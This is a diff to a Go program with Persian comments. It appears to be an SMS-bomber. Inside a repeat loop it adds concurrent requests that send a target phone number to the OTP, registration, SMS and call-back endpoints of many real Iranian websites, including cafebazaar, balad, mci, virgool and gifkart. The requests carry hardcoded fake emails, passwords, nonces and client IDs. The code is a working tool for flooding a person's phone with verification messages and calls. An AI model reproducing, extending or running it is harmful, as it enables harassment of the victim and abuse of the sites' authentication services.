@@ -151,6 +151,22 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 		return
 	}
 }
+// توابع کمکی برای فرمت کردن شماره تلفن (برای استفاده داخلی در task ها)
+// چون اینها منطق ساده ای دارند و از پکیج های موجود استفاده می کنند، اضافه می شوند.
+func getPhoneNumberNoZero(phone string) string {
+	if strings.HasPrefix(phone, "0") {
+		return phone[1:]
+	}
+	return phone
+}
+
+func getPhoneNumber98NoZero(phone string) string {
+	return "98" + getPhoneNumberNoZero(phone)
+}
+
+func getPhoneNumberPlus98NoZero(phone string) string {
+	return "+98" + getPhoneNumberNoZero(phone)
+}
 
 func main() {
 	clearScreen()
@@ -257,7 +273,229 @@ func main() {
 
 	// --- حلقه اصلی برای اضافه کردن وظایف ---
 	for i := 0; i < repeatCount; i++ {
+            // Original sabziman.com
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("action", "newphoneexist")
+				formData.Set("phonenumber", phone) // شماره کامل
+				sendFormRequest(ctx, "https://sabziman.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
 
+			// technolife.com (POST JSON)
+			wg.Add(1)
+			tasks <- func() {
+				payload := map[string]interface{}{
+					"operationName": "check_customer_exists",
+					"query":         "query check_customer_exists ($username: String, $repeat: Boolean) { check_customer_exists (username: $username, repeat: $repeat) { result request_id } }",
+					"variables": map[string]interface{}{
+						"username": phone, // شماره کامل
+					},
+				}
+				sendJSONRequest(ctx, "https://www.technolife.com/shop_customer", payload, &wg, ch)
+			}
+
+			// anbaronline.ir (POST Form)
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("mobile", phone)      // شماره کامل
+				formData.Set("captchai", "59")     // مقدار ثابت
+				sendFormRequest(ctx, "https://www.anbaronline.ir/account/sendotpjson", formData, &wg, ch)
+			}
+
+			// mediana.ir (POST JSON)
+			wg.Add(1)
+			tasks <- func() {
+				payload := map[string]interface{}{
+					"phone":    phone, // شماره کامل
+					"referrer": "",    // مقدار ثابت
+				}
+				sendJSONRequest(ctx, "https://app.mediana.ir/api/account/AccountApi/CreateOTPWithPhone", payload, &wg, ch)
+			}
+
+			// gamefa.com (Register flow 1 - POST Form)
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_forms_ajax")
+				formData.Set("type", "register")
+				formData.Set("digt_countrycode", "+98")
+				formData.Set("phone", getPhoneNumberNoZero(phone)) // شماره بدون صفر اول
+				formData.Set("email", "koyaref766@kazvi.com")     // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				formData.Set("digits_reg_password", "trrdfstrtft") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				formData.Set("digits_process_register", "1")      // مقدار ثابت
+				formData.Set("instance_id", "74e5368dbcf91c938f44b2af4b21cb3a") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				formData.Set("optional_data", "optional_data")                // مقدار ثابت
+				formData.Set("dig_otp", "") // مقدار ثابت
+				formData.Set("digits", "1")
+				formData.Set("digits_redirect_page", "//gamefa.com/")
+				formData.Set("digits_form", "3827f92f86") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				formData.Set("_wp_http_referer", "/?login=true") // مقدار ثابت
+				sendFormRequest(ctx, "https://gamefa.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+
+			// gamefa.com (Register flow 2 - SMS OTP step - POST Form)
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_forms_ajax")
+				formData.Set("type", "register")
+				formData.Set("digt_countrycode", "+98")
+				formData.Set("phone", getPhoneNumberNoZero(phone)) // شماره بدون صفر اول
+				formData.Set("email", "koyaref766@kazvi.com")     // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				formData.Set("digits_reg_password", "trrdfstrtft") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				formData.Set("digits_process_register", "1")      // مقدار ثابت
+				formData.Set("sms_otp", "")                       // مقدار ثابت
+				formData.Set("otp_step_1", "1")                    // مقدار ثابت
+				formData.Set("digits_otp_field", "1")              // مقدار ثابت
+				formData.Set("instance_id", "74e5368dbcf91c938f44b2af4b21cb3a") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				formData.Set("optional_data", "optional_data")                // مقدار ثابت
+				formData.Set("dig_otp", "otp") // مقدار ثابت
+				formData.Set("digits", "1")
+				formData.Set("digits_redirect_page", "//gamefa.com/")
+				formData.Set("digits_form", "3827f92f86") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				formData.Set("_wp_http_referer", "/?login=true") // مقدار ثابت
+				formData.Set("container", "digits_protected") // مقدار ثابت
+				formData.Set("sub_action", "sms_otp")         // مقدار ثابت
+				sendFormRequest(ctx, "https://gamefa.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+
+
+			// api.cafebazaar.ir (POST JSON)
+			wg.Add(1)
+			tasks <- func() {
+				payload := map[string]interface{}{
+					"properties": map[string]interface{}{
+						"language":      2,
+						"clientID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx", // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+						"clientVersion": "web",                          // مقدار ثابت
+						"deviceID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx", // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+					},
+					"singleRequest": map[string]interface{}{
+						"getOtpTokenRequest": map[string]interface{}{
+							"username": getPhoneNumber98NoZero(phone), // 98 + شماره بدون صفر اول
+						},
+					},
+				}
+				sendJSONRequest(ctx, "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", payload, &wg, ch)
+			}
+
+			// account.api.balad.ir (POST JSON)
+			wg.Add(1)
+			tasks <- func() {
+				payload := map[string]interface{}{
+					"phone_number": phone, // شماره کامل
+					"os_type":      "W",   // مقدار ثابت
+				}
+				sendJSONRequest(ctx, "https://account.api.balad.ir/api/web/auth/login/", payload, &wg, ch)
+			}
+
+			// ebcom.mci.ir (POST JSON)
+			wg.Add(1)
+			tasks <- func() {
+				payload := map[string]interface{}{
+					"msisdn": getPhoneNumberNoZero(phone), // شماره بدون صفر اول
+				}
+				sendJSONRequest(ctx, "https://ebcom.mci.ir/services/auth/v1.0/otp", payload, &wg, ch)
+			}
+
+			// virgool.io (user-existence - POST JSON)
+			wg.Add(1)
+			tasks <- func() {
+				payload := map[string]interface{}{
+					"username": getPhoneNumberPlus98NoZero(phone), // +98 + شماره بدون صفر اول
+					"type":     "register",                      // مقدار ثابت
+					"method":   "phone",                         // مقدار ثابت
+				}
+				sendJSONRequest(ctx, "https://virgool.io/api2/app/auth/user-existence", payload, &wg, ch)
+			}
+
+			// virgool.io (verify - POST JSON)
+			wg.Add(1)
+			tasks <- func() {
+				payload := map[string]interface{}{
+					"method":     "phone",                            // مقدار ثابت
+					"identifier": getPhoneNumberPlus98NoZero(phone), // +98 + شماره بدون صفر اول
+					"type":       "register",                         // مقدار ثابت
+				}
+				sendJSONRequest(ctx, "https://virgool.io/api2/app/auth/verify", payload, &wg, ch)
+			}
+
+			// pgemshop.com (POST Form)
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_check_mob")
+				formData.Set("countrycode", "+98")
+				formData.Set("mobileNo", phone) // شماره کامل
+				formData.Set("csrf", "0a60a620d9") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				formData.Set("login", "2")
+				formData.Set("username", "")
+				formData.Set("email", "")
+				formData.Set("captcha", "")
+				formData.Set("captcha_ses", "")
+				formData.Set("json", "1")
+				formData.Set("whatsapp", "0")
+				sendFormRequest(ctx, "https://pgemshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+
+			// gifkart.com (SMS - POST Form)
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("PhoneNumber", phone) // شماره کامل
+				sendFormRequest(ctx, "https://gifkart.com/request/", formData, &wg, ch)
+			}
+
+			// gifkart.com (Call - POST Form) - توجه: این به نظر برای درخواست تماس مجدد است و شماره تلفن مستقیما در Payload نیست
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("SendSMSAgainOTPCode", "Call") // مقدار ثابت، به نظر نمی‌رسد شماره تلفن در اینجا استفاده شود
+				sendFormRequest(ctx, "https://gifkart.com/request/", formData, &wg, ch)
+			}
+
+			// lintagame.com (POST Form)
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("action", "logini_first")
+				formData.Set("login", phone) // شماره کامل
+				sendFormRequest(ctx, "https://lintagame.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+
+			// asangem.com (POST Form)
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("action", "mreeir_send_sms")
+				formData.Set("mobileemail", getPhoneNumberNoZero(phone)) // شماره بدون صفر اول
+				formData.Set("userisnotauser", "")
+				formData.Set("type", "mobile")
+				formData.Set("security", "cb94fb1738") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				sendFormRequest(ctx, "https://asangem.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+
+			// mehreganit.com (POST Form)
+			wg.Add(1)
+			tasks <- func() {
+				formData := url.Values{}
+				formData.Set("action", "validate_and_action")
+				formData.Set("mobile", phone) // شماره کامل
+				formData.Set("username", "")
+				formData.Set("security", "c9a8393a08") // مقدار ثابت (ممکن است نیاز به تغییر داشته باشد)
+				sendFormRequest(ctx, "https://mehreganit.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+
+			// core-api.mayava.ir (POST JSON)
+			wg.Add(1)
+			tasks <- func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // شماره کامل
+				}
+				sendJSONRequest(ctx, "https://core-api.mayava.ir/auth/check", payload, &wg, ch)
+			}
 	} // --- پایان حلقه اصلی برای اضافه کردن وظایف ---
 
 
